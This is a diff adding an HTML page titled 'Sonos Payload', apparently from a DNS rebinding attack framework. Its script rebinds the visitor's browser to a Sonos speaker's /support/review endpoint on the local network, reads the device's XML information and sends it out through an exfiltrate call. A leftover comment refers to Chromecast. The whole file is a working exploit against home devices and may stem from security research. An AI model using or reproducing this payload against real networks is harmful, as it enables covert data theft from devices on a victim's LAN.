@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sonos Payload</title>
+</head>
+<body>
+    <script type="text/javascript" src="/share/js/DNSRebindNode.js"></script>
+<script type="text/javascript">
+(function() {
+
+    // note, Chromecast requires Origin to be unset for GET requests to /setup,
+    // however Firefox doesn't allow you to do this with the fetch API, so this exploit
+    // doesn't work in firefox.
+    attack()
+    .then(() => {},
+          err => {
+              console.error(err)
+              DNSRebindNode.emit('fatal', err.message)
+          }
+    )
+    .then(() => DNSRebindNode.destroy())
+
+    async function attack() {
+
+        const getOptions = DNSRebindNode.fetchOptions()
+
+        try {
+            const opts = { fetchOptions: getOptions }
+            const result = await DNSRebindNode.rebind(`http://${location.host}/support/review`, opts)
+            if (result.ok) {
+                const xml = await result.text()
+                return await DNSRebindNode.exfiltrate('sonos-info', xml, 'xml')
+            } else {
+                return Promise.reject(result)
+            }
+        } catch (err) {
+            return Promise.reject(err)
+        }
+    }
+})()
+</script>
+</body>
+</html>
